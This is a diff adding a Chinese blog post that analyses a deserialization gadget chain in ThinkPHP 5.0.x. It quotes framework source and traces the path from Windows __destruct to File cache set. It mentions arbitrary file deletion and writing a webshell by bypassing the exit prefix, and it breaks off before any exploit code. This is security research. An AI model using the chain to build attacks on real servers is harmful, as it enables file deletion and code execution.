@@ -1,0 +1,633 @@
+<!DOCTYPE html>
+<html lang="en" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="keywords" content="" />
+  <meta name="author" content="ki10Moc" />
+  <meta name="description" content="" />
+  
+  
+  <title>
+    
+      ThinkPHP5.0.x 反序列化分析 
+      
+      
+      |
+    
+     ki10Moc&#39;s World
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/1.png">
+    <link rel="icon" href="/images/1.png">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  
+<link rel="stylesheet" href="/css/color-scheme.css">
+<link rel="stylesheet" href="/css/base.css">
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css">
+<link rel="stylesheet" href="/css/github-markdown.css">
+<link rel="stylesheet" href="/css/highlight.css">
+<link rel="stylesheet" href="/css/comments.css">
+
+  <!-- 代码块风格 -->
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
+  
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-RG82N8DQZ9"></script>
+    <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+
+      gtag('config', 'G-RG82N8DQZ9');
+    </script>
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+<meta name="generator" content="Hexo 6.2.0"><link rel="alternate" href="/atom.xml" title="ki10Moc's World" type="application/atom+xml">
+</head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/images/1.png" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">ki10Moc</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">主页</a>
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          <a href="/tags/">标签</a>
+        </li>
+      
+        <li class="nav-item" data-path="/friends/">
+          <a href="/friends/">友链</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">ki10Moc</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
+  
+  
+<script src="/js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">ThinkPHP5.0.x 反序列化分析</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime" title="Update time"></i>
+          2022-07-29 01:19:17
+        </span>
+        
+              <span class="post-tags">
+                <i class="iconfont icon-tags" title="Tags"></i>
+                
+                <span class="span--tag">
+                  <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" title="代码审计">
+                    <b>#</b> 代码审计
+                  </a>
+                </span>
+                
+                <span class="span--tag">
+                  <a href="/tags/thinkphp%E6%A1%86%E6%9E%B6/" title="thinkphp框架">
+                    <b>#</b> thinkphp框架
+                  </a>
+                </span>
+                
+              </span>
+          
+      </div>
+      <div class="markdown-body">
+        <h3 id="漏洞分析"><a class="markdownIt-Anchor" href="#漏洞分析">#</a> 漏洞分析</h3>
+<p>起点为 /thinkphp/library/think/process/pipes/Windows.php 的__destruct ()</p>
+<p><img src="https://img-blog.csdnimg.cn/9336a4bf7ec34871a412ae513931bc7d.png" alt="在这里插入图片描述"></p>
+<p>跟进其中的 removeFiles () 函数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">removeFiles</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;files <span class="keyword">as</span> <span class="variable">$filename</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>)) &#123;</span><br><span class="line">                @<span class="title function_ invoke__">unlink</span>(<span class="variable">$filename</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;files = [];</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>其中 <code>files</code>  是可控的<br>
+这里存在任意文件删除的漏洞点</p>
+<p>file_exists 对 filename 进行处理，会将其当做 String 类型的<br>
+可以触发任意类的 <code>__toString</code>  方法</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_writable</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$filename</span></span>): <span class="title">bool</span> </span>&#123;&#125;</span><br></pre></td></tr></table></figure>
+<p>在 <code>think</code>  下的 <code>Model.php</code>  中存在一处</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">toJson</span>();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>一直到 <code>toArray</code>  方法</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 转换当前模型对象为数组</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@access</span> public</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> array</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">toArray</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$item</span>    = [];</span><br><span class="line">        <span class="variable">$visible</span> = [];</span><br><span class="line">        <span class="variable">$hidden</span>  = [];</span><br><span class="line"></span><br><span class="line">        <span class="variable">$data</span> = <span class="title function_ invoke__">array_merge</span>(<span class="variable">$this</span>-&gt;data, <span class="variable">$this</span>-&gt;relation);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 过滤属性</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;visible)) &#123;</span><br><span class="line">            <span class="variable">$array</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parseAttr</span>(<span class="variable">$this</span>-&gt;visible, <span class="variable">$visible</span>);</span><br><span class="line">            <span class="variable">$data</span>  = <span class="title function_ invoke__">array_intersect_key</span>(<span class="variable">$data</span>, <span class="title function_ invoke__">array_flip</span>(<span class="variable">$array</span>));</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (!<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;hidden)) &#123;</span><br><span class="line">            <span class="variable">$array</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parseAttr</span>(<span class="variable">$this</span>-&gt;hidden, <span class="variable">$hidden</span>, <span class="literal">false</span>);</span><br><span class="line">            <span class="variable">$data</span>  = <span class="title function_ invoke__">array_diff_key</span>(<span class="variable">$data</span>, <span class="title function_ invoke__">array_flip</span>(<span class="variable">$array</span>));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$data</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$val</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$val</span> <span class="keyword">instanceof</span> Model || <span class="variable">$val</span> <span class="keyword">instanceof</span> ModelCollection) &#123;</span><br><span class="line">                <span class="comment">// 关联模型对象</span></span><br><span class="line">                <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">subToArray</span>(<span class="variable">$val</span>, <span class="variable">$visible</span>, <span class="variable">$hidden</span>, <span class="variable">$key</span>);</span><br><span class="line">            &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$val</span>) &amp;&amp; <span class="title function_ invoke__">reset</span>(<span class="variable">$val</span>) <span class="keyword">instanceof</span> Model) &#123;</span><br><span class="line">                <span class="comment">// 关联模型数据集</span></span><br><span class="line">                <span class="variable">$arr</span> = [];</span><br><span class="line">                <span class="keyword">foreach</span> (<span class="variable">$val</span> <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">                    <span class="variable">$arr</span>[<span class="variable">$k</span>] = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">subToArray</span>(<span class="variable">$value</span>, <span class="variable">$visible</span>, <span class="variable">$hidden</span>, <span class="variable">$key</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable">$arr</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// 模型属性</span></span><br><span class="line">                <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getAttr</span>(<span class="variable">$key</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 追加属性（必须定义获取器）</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;append)) &#123;</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;append <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$name</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$name</span>)) &#123;</span><br><span class="line">                    <span class="comment">// 追加关联对象属性</span></span><br><span class="line">                    <span class="variable">$relation</span>   = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getAttr</span>(<span class="variable">$key</span>);</span><br><span class="line">                    <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable">$relation</span>-&gt;<span class="title function_ invoke__">append</span>(<span class="variable">$name</span>)-&gt;<span class="title function_ invoke__">toArray</span>();</span><br><span class="line">                &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$name</span>, <span class="string">&#x27;.&#x27;</span>)) &#123;</span><br><span class="line">                    <span class="keyword">list</span>(<span class="variable">$key</span>, <span class="variable">$attr</span>) = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$name</span>);</span><br><span class="line">                    <span class="comment">// 追加关联对象属性</span></span><br><span class="line">                    <span class="variable">$relation</span>   = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getAttr</span>(<span class="variable">$key</span>);</span><br><span class="line">                    <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable">$relation</span>-&gt;<span class="title function_ invoke__">append</span>([<span class="variable">$attr</span>])-&gt;<span class="title function_ invoke__">toArray</span>();</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="variable">$relation</span> = <span class="title class_">Loader</span>::<span class="title function_ invoke__">parseName</span>(<span class="variable">$name</span>, <span class="number">1</span>, <span class="literal">false</span>);</span><br><span class="line">                    <span class="keyword">if</span> (<span class="title function_ invoke__">method_exists</span>(<span class="variable">$this</span>, <span class="variable">$relation</span>)) &#123;</span><br><span class="line">                        <span class="variable">$modelRelation</span> = <span class="variable language_">$this</span>-&gt;<span class="variable">$relation</span>();</span><br><span class="line">                        <span class="variable">$value</span>         = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getRelationData</span>(<span class="variable">$modelRelation</span>);</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">if</span> (<span class="title function_ invoke__">method_exists</span>(<span class="variable">$modelRelation</span>, <span class="string">&#x27;getBindAttr&#x27;</span>)) &#123;</span><br><span class="line">                            <span class="variable">$bindAttr</span> = <span class="variable">$modelRelation</span>-&gt;<span class="title function_ invoke__">getBindAttr</span>();</span><br><span class="line">                            <span class="keyword">if</span> (<span class="variable">$bindAttr</span>) &#123;</span><br><span class="line">                                <span class="keyword">foreach</span> (<span class="variable">$bindAttr</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$attr</span>) &#123;</span><br><span class="line">                                    <span class="variable">$key</span> = <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$key</span>) ? <span class="variable">$attr</span> : <span class="variable">$key</span>;</span><br><span class="line">                                    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;data[<span class="variable">$key</span>])) &#123;</span><br><span class="line">                                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&#x27;bind attr has exists:&#x27;</span> . <span class="variable">$key</span>);</span><br><span class="line">                                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                        <span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable">$value</span> ? <span class="variable">$value</span>-&gt;<span class="title function_ invoke__">getAttr</span>(<span class="variable">$attr</span>) : <span class="literal">null</span>;</span><br><span class="line">                                    &#125;</span><br><span class="line">                                &#125;</span><br><span class="line">                                <span class="keyword">continue</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="variable">$item</span>[<span class="variable">$name</span>] = <span class="variable">$value</span>;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="variable">$item</span>[<span class="variable">$name</span>] = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getAttr</span>(<span class="variable">$name</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> !<span class="keyword">empty</span>(<span class="variable">$item</span>) ? <span class="variable">$item</span> : [];</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>在这段代码中值得注意的是</p>
+<p><img src="https://img-blog.csdnimg.cn/de046c6d69424c5f9229c2316c8655fe.png" alt="在这里插入图片描述"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable">$relation</span>-&gt;<span class="title function_ invoke__">append</span>(<span class="variable">$name</span>)-&gt;<span class="title function_ invoke__">toArray</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable">$relation</span>-&gt;<span class="title function_ invoke__">append</span>([<span class="variable">$attr</span>])-&gt;<span class="title function_ invoke__">toArray</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$bindAttr</span> = <span class="variable">$modelRelation</span>-&gt;<span class="title function_ invoke__">getBindAttr</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$item</span>[<span class="variable">$key</span>] = <span class="variable">$value</span> ? <span class="variable">$value</span>-&gt;<span class="title function_ invoke__">getAttr</span>(<span class="variable">$attr</span>) : <span class="literal">null</span>;</span><br></pre></td></tr></table></figure>
+<p>这四处是可以调用到__call 方法的</p>
+<p>例如用第四处进行调用</p>
+<p><code>$modelRelation</code>  是通过 <code>$this-&gt;getAttr($key)</code>  赋值<br>
+要调用 <code>Output</code>  下的__call，这里的 <code>$value</code>  也需要时 <code>Output</code>  的对象</p>
+<p>其中 <code>getRelationData</code>  对获取的值进行处理</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getRelationData</span>(<span class="params">Relation <span class="variable">$modelRelation</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;<span class="built_in">parent</span> &amp;&amp; !<span class="variable">$modelRelation</span>-&gt;<span class="title function_ invoke__">isSelfRelation</span>() &amp;&amp; <span class="title function_ invoke__">get_class</span>(<span class="variable">$modelRelation</span>-&gt;<span class="title function_ invoke__">getModel</span>()) == <span class="title function_ invoke__">get_class</span>(<span class="variable">$this</span>-&gt;<span class="built_in">parent</span>)) &#123;</span><br><span class="line">            <span class="variable">$value</span> = <span class="variable language_">$this</span>-&gt;<span class="built_in">parent</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 首先获取关联数据</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">method_exists</span>(<span class="variable">$modelRelation</span>, <span class="string">&#x27;getRelation&#x27;</span>)) &#123;</span><br><span class="line">                <span class="variable">$value</span> = <span class="variable">$modelRelation</span>-&gt;<span class="title function_ invoke__">getRelation</span>();</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">BadMethodCallException</span>(<span class="string">&#x27;method not exists:&#x27;</span> . <span class="title function_ invoke__">get_class</span>(<span class="variable">$modelRelation</span>) . <span class="string">&#x27;-&gt; getRelation&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>跟进到 <code>isSelfRelation</code>  和 <code>getModel</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isSelfRelation</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;selfRelation;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getModel</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;query-&gt;<span class="title function_ invoke__">getModel</span>();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getModel</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;model;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>发现都是可控的</p>
+<p>上面提到 <code>$value</code>  需要是 <code>Output</code>  的对象<br>
+当然这里的参数也需要是该类对象<br>
+<img src="https://img-blog.csdnimg.cn/294911eb27d54342bf84d2cf649436e6.png" alt="在这里插入图片描述"></p>
+<p>也就是 <code>return $this-&gt;model;</code>  和 <code>get_class($this-&gt;parent)</code>  为同类</p>
+<p>接着跟进 <code>getBindAttr</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getBindAttr</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;bindAttr;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>依然可控</p>
+<p>那就可以执行最后 <code>$item[$key] = $value ? $value-&gt;getAttr($attr) : null;</code></p>
+<p>那么下面就来分析这个类<br>
+<img src="https://img-blog.csdnimg.cn/4b1cbc5256b2443eb9be445bfa539bf7.png" alt="在这里插入图片描述"><br>
+首先看下回调的 <code>block</code>  方法<br>
+一直跟进到<br>
+<img src="https://img-blog.csdnimg.cn/4b1cbc5256b2443eb9be445bfa539bf7.png" alt="在这里插入图片描述"><br>
+注意到 <code>handle</code>  可控，搜索下调用的 <code>write</code>  方法<br>
+ <code>Memcached.php</code> <br>
+<img src="https://img-blog.csdnimg.cn/aa70d58ebd774ccba6e1c2c140a8dfa4.png" alt="在这里插入图片描述"></p>
+<p>接着搜索 <code>set</code>  方法<br>
+ <code>File.php</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">set</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$value</span>, <span class="variable">$expire</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_null</span>(<span class="variable">$expire</span>)) &#123;</span><br><span class="line">            <span class="variable">$expire</span> = <span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;expire&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$expire</span> <span class="keyword">instanceof</span> \DateTime) &#123;</span><br><span class="line">            <span class="variable">$expire</span> = <span class="variable">$expire</span>-&gt;<span class="title function_ invoke__">getTimestamp</span>() - <span class="title function_ invoke__">time</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$filename</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getCacheKey</span>(<span class="variable">$name</span>, <span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;tag &amp;&amp; !<span class="title function_ invoke__">is_file</span>(<span class="variable">$filename</span>)) &#123;</span><br><span class="line">            <span class="variable">$first</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$data</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$value</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;data_compress&#x27;</span>] &amp;&amp; <span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;gzcompress&#x27;</span>)) &#123;</span><br><span class="line">            <span class="comment">//数据压缩</span></span><br><span class="line">            <span class="variable">$data</span> = <span class="title function_ invoke__">gzcompress</span>(<span class="variable">$data</span>, <span class="number">3</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$data</span>   = <span class="string">&quot;&lt;?php\n//&quot;</span> . <span class="title function_ invoke__">sprintf</span>(<span class="string">&#x27;%012d&#x27;</span>, <span class="variable">$expire</span>) . <span class="string">&quot;\n exit();?&gt;\n&quot;</span> . <span class="variable">$data</span>;</span><br><span class="line">        <span class="variable">$result</span> = <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$data</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$result</span>) &#123;</span><br><span class="line">            <span class="keyword">isset</span>(<span class="variable">$first</span>) &amp;&amp; <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">setTagItem</span>(<span class="variable">$filename</span>);</span><br><span class="line">            <span class="title function_ invoke__">clearstatcache</span>();</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>注意到<br>
+<img src="https://img-blog.csdnimg.cn/7ed8e9c4bf55478db18c1222aeffc11d.png" alt="在这里插入图片描述"><br>
+可以通过伪协议写入 <code>shell</code>  并绕过死亡 <code>exit</code></p>
+<p><img src="https://img-blog.csdnimg.cn/bf4b247fd202475dbc387ca2785999ed.png" alt="在这里插入图片描述"><br>
+<img src="https://img-blog.csdnimg.cn/798a22f3fd86446cbcccfea96aa7fa98.png" alt="在这里插入图片描述"><br>
+由于最后调用 set 方法中的参数来自先前调用的 write 方法只能为 true，且这里 $expire 只能为数值，这样文件内容就无法写 shell</p>
+<p>所以后面无法在文件内容写入 <code>shell</code></p>
+<p>在后面的 <code>setRagItem</code>  函数会再次执行 <code>set</code>  方法</p>
+<h3 id="过程"><a class="markdownIt-Anchor" href="#过程">#</a> 过程</h3>
